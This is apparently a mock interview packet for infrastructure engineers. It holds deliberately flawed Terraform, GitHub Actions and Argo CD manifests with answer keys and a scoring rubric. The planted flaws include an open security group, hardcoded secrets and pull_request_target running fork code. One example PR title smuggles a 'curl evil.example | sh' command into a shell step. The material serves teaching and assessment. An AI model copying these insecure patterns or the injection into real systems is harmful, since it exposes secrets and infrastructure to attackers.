# Mock Interview 4: IaC, CI/CD & GitOps Deep Dive

Simulates a 60-minute technical session combining code review of flawed artifacts with architectural deep dives.

---

## Candidate Brief (Safe to read in advance)

- **Duration:** 60 minutes.
- **Format:** Code review and architecture drill. You will be presented with flawed Terraform and CI/CD manifests, asked to identify bugs, security vulnerabilities, and anti-patterns, and then defend a modern GitOps delivery architecture.

---

## Interviewer Packet (Confidential — Do not read beforehand)

Each variant has two artifacts with exactly four planted flaws each. Show each artifact verbatim. If the candidate misses a flaw, ask about the *area* ("anything about how state is stored?"), never the flaw itself.

### Variant A: Open Bucket & Push-Based Deploy

#### Segment 1: Flawed Terraform Code Review
Present this flawed snippet to the candidate:
```hcl
resource "aws_s3_bucket" "data" {
  bucket = "company-customer-data"
}

resource "aws_security_group" "web" {
  name = "web-sg"
  ingress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "null_resource" "init" {
  provisioner "local-exec" {
    command = "curl -X POST https://api.internal.corp/token -d 'secret=${var.db_password}'"
  }
}
```
- **Flaws Candidate Must Spot:**
  1. *S3 Bucket:* Unencrypted, missing `aws_s3_bucket_public_access_block`, missing versioning and lifecycle rules.
  2. *Security Group:* Completely open ingress on all protocols (`-1`) to `0.0.0.0/0` (massive security violation).
  3. *Local-Exec:* Plaintext secret exfiltration; imperative `local-exec` breaks portability and leaks secrets in CI logs.
  4. *State Risk:* Lack of declarative `moved` or lifecycle guards.

#### Segment 2: Flawed CI/CD GitOps Pipeline Review
Present this GitHub Actions snippet:
```yaml
name: Deploy Production
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: self-hosted-static-vm
    steps:
      - uses: actions/checkout@v3
      - run: |
          docker build -t registry.corp/app:latest .
          docker push registry.corp/app:latest
          aws eks update-kubeconfig --name prod-cluster
          kubectl set image deployment/app app=registry.corp/app:latest
```
- **Flaws Candidate Must Spot:**
  1. *Runner:* Static self-hosted VM leaks credentials and state; should use ephemeral ARC runners.
  2. *Image Tagging:* Uses mutable `latest` tag; impossible to rollback or audit; should use Git commit SHA.
  3. *Push Model:* CI runner holds cluster-admin `kubeconfig`; should use pull-based GitOps (Argo CD).
  4. *Security:* Missing container image signing (Cosign), missing SBOM generation (Syft), missing vulnerability scan (Trivy).

### Variant B: Shared State & PR Preview Pipeline

#### Segment 1: Flawed Terraform Root Module Review
Present this excerpt from a production root module (the VPC and subnet group are defined elsewhere):
```hcl
terraform {
  backend "s3" {
    bucket = "acme-tf-state"
    key    = "prod/orders.tfstate"
    region = "us-east-1"
  }
}

provider "aws" {
  region = "us-east-1"
}

variable "private_subnet_cidrs" {
  default = ["10.20.1.0/24", "10.20.2.0/24", "10.20.3.0/24"]
}

resource "aws_subnet" "private" {
  count      = length(var.private_subnet_cidrs)
  vpc_id     = aws_vpc.main.id
  cidr_block = var.private_subnet_cidrs[count.index]
}

resource "aws_db_instance" "orders" {
  identifier           = "orders-prod"
  engine               = "postgres"
  instance_class       = "db.r6g.large"
  allocated_storage    = 100
  username             = "orders_admin"
  password             = "Orders-2026!"
  skip_final_snapshot  = true
  db_subnet_group_name = aws_db_subnet_group.private.name
}
```
- **Flaws Candidate Must Spot:**
  1. *Unpinned toolchain:* No `required_version` or `required_providers` constraints, so a fresh `terraform init -upgrade` can pull a new provider major version straight into prod. **Strong answer:** pin versions, commit `.terraform.lock.hcl`, and upgrade providers through reviewed PRs (Renovate or Dependabot).
  2. *Unsafe state backend:* No state locking, so two concurrent applies can corrupt state. The state also holds the database password in plaintext, so anyone who can read the bucket can read the secret. **Strong answer:** S3-native locking (`use_lockfile = true`) on current Terraform and OpenTofu releases, or a DynamoDB lock table on older ones; bucket versioning to recover bad state; a KMS key and a bucket policy limiting who can read state.
  3. *`count` over a list:* Removing the first CIDR shifts every index, so Terraform destroys and recreates subnets that hold running databases and nodes. **Strong answer:** `for_each` over a map keyed by AZ or name, with `moved` blocks to migrate the existing addresses without recreation.
  4. *Secrets and data-loss guards:* The password is hardcoded (in Git and in state), and `skip_final_snapshot = true` with no `deletion_protection` means a bad plan or a `destroy` deletes production data with no snapshot. **Strong answer:** `manage_master_user_password = true` (RDS keeps the secret in Secrets Manager), `deletion_protection = true`, a `prevent_destroy` lifecycle guard, and a plan-time policy check that blocks deletion of stateful resources.

#### Segment 2: Flawed PR Preview Workflow Review
Present this GitHub Actions workflow:
```yaml
name: PR Preview
on:
  pull_request_target:
    types: [opened, synchronize]
permissions: write-all
jobs:
  preview:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: some-vendor/setup-preview@main
      - name: Announce
        run: echo "Deploying preview for: ${{ github.event.pull_request.title }}"
      - name: Deploy preview
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: ./scripts/deploy-preview.sh "pr-${{ github.event.number }}"
```
- **Flaws Candidate Must Spot:**
  1. *Untrusted code in a privileged context:* `pull_request_target` runs with the base repository's secrets and a write token, and the job then checks out and executes the PR author's code (`./scripts/deploy-preview.sh` comes from the fork). Any outside contributor can exfiltrate the secrets. **Strong answer:** build untrusted code under `pull_request` with no secrets; if previews need credentials, split into an unprivileged build workflow and a privileged `workflow_run` deploy that never executes PR code, gated by a label or an environment approval.
  2. *Script injection:* The PR title is interpolated straight into a shell command, so a title such as `x"; curl https://evil.example/s | sh; echo "` runs as code. **Strong answer:** pass untrusted values through `env:` and reference them as quoted shell variables.
  3. *Mutable action references:* `some-vendor/setup-preview@main` (and tags like `@v4`) can be repointed by whoever controls that repository. The tj-actions/changed-files compromise in March 2025 did exactly this and dumped CI secrets into build logs. **Strong answer:** pin actions to full commit SHAs, update them through Dependabot or Renovate, and allow-list actions at the organization level.
  4. *Credentials and token scope:* Long-lived AWS access keys in repository secrets, plus `permissions: write-all`. **Strong answer:** OIDC federation (`id-token: write` and an IAM role whose trust policy is scoped to this repository and environment) and least-privilege `permissions` per job, for example `contents: read` and `pull-requests: write`.

### Variant C: Shared Module & Fleet-Wide Add-On Rollout

#### Segment 1: Flawed Shared Terraform Module Review
Present this excerpt (data sources omitted). The module is consumed by 120 services:
```hcl
# modules/service/main.tf
provider "aws" {
  region = var.region
}

variable "name" {}
variable "env" {}
variable "region" {}

resource "aws_iam_role" "task" {
  name               = "${var.name}-task"
  assume_role_policy = data.aws_iam_policy_document.task_assume.json
}

resource "aws_iam_role_policy_attachment" "task" {
  role       = aws_iam_role.task.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

resource "aws_sqs_queue" "jobs" {
  name = "${var.name}-jobs"
}

# live/prod/checkout/main.tf
module "checkout" {
  source = "git::https://github.com/acme/tf-modules.git//service"
  name   = "checkout"
  env    = "prod"
  region = "us-east-1"
}
```
- **Flaws Candidate Must Spot:**
  1. *Provider block inside a shared module:* The module can't be called with `count`, `for_each` or `depends_on`; callers can't pass provider aliases for other regions or accounts; and removing a module call later fails because its provider configuration disappears with it. **Strong answer:** modules declare only `required_providers`; root modules configure providers and pass aliases in with `providers = { ... }`.
  2. *Unpinned module source:* No `?ref=` on the Git source, so every `init` takes whatever is on the default branch, and one module change lands in 120 services' production plans untested. **Strong answer:** semver tags (`?ref=v3.2.1`) or a private registry with version constraints, release notes, and Renovate PRs that roll new versions out in waves.
  3. *Over-privileged workload role:* `AdministratorAccess` on a service role, so one compromised container owns the account. **Strong answer:** a least-privilege policy scoped to what the module creates (for example `sqs:SendMessage` and `sqs:ReceiveMessage` on this queue's ARN), permission boundaries, and a plan-time policy check (OPA/Conftest or Checkov) that blocks admin attachments.
  4. *Weak module interface:* Variables are untyped, undocumented and unvalidated, and `env` is accepted but never used. Names like `checkout-task` collide when staging and prod share an account (IAM role names are unique per account), and nothing is tagged for ownership or cost allocation. **Strong answer:** typed variables with descriptions and `validation` blocks, environment-qualified names, provider `default_tags` for owner, environment and cost center, and `terraform test` coverage of the module's contract.

#### Segment 2: Flawed GitOps Fleet Rollout Review
Present this Argo CD ApplicationSet:
```yaml
apiVersion: argoproj.io/v1alpha1
kind: ApplicationSet
metadata:
  name: edge-addons
  namespace: argocd
spec:
  generators:
    - clusters: {}
  template:
    metadata:
      name: '{{name}}-ingress'
    spec:
      project: default
      source:
        repoURL: https://kubernetes.github.io/ingress-nginx
        chart: ingress-nginx
        targetRevision: "*"
        helm:
          values: |
            controller:
              replicaCount: 1
      destination:
        server: '{{server}}'
        namespace: ingress
      syncPolicy:
        automated:
          prune: true
          selfHeal: true
        syncOptions:
          - CreateNamespace=true
```
- **Flaws Candidate Must Spot:**
  1. *Fleet-wide blast radius:* The empty `clusters: {}` generator targets every registered cluster at once, so one bad change reaches the whole fleet in a single wave (the correlated-failure pattern from Mock 6). **Strong answer:** label clusters into rings (canary, one region, everything else) and promote ring by ring, either with one ApplicationSet per ring plus promotion PRs or with Argo CD's ApplicationSet progressive sync feature, with health checks gating each step.
  2. *Floating chart version:* `targetRevision: "*"` deploys every new upstream chart release to production automatically. **Strong answer:** pin an exact chart version and move upgrades through the rings by PR.
  3. *Default AppProject:* `project: default` allows any source repository, any destination and cluster-scoped resources. **Strong answer:** a dedicated AppProject for platform add-ons with explicit `sourceRepos`, `destinations` and a cluster-resource allow-list, plus matching RBAC.
  4. *The add-on itself:* ingress-nginx was retired in March 2026 and no longer receives security fixes, and it runs as a single replica with no PodDisruptionBudget, so every node drain or upgrade drops ingress traffic. **Strong answer:** plan the move to a maintained Gateway API implementation (see Mock 3, Variant B), and in the meantime run at least two replicas spread across zones with a PDB.

---

## Scoring Rubric

| Score | Anchor | Behavioral Criteria |
| :---: | :--- | :--- |
| **1** | Strong No Hire | Misses the critical flaws of the variant: the open security group and `latest` image tag (A), the `pull_request_target` checkout of PR code (B), or the `AdministratorAccess` attachment and fleet-wide unpinned rollout (C). |
| **2** | No Hire | Identifies syntax issues but misses supply-chain security and GitOps architectural anti-patterns. |
| **3** | Hire | Identifies 80%+ of flaws immediately; articulates modern remediation cleanly. |
| **4** | Strong Hire | Identifies all flaws; rewrites manifests into pristine, production-ready modules with OPA and Cosign. |

---

## Self-Debrief Template
- **Variant:** A / B / C
- **Flaws Identified (Terraform):** ___ / 4
- **Flaws Identified (CI/CD):** ___ / 4
- **Key Learnings:**
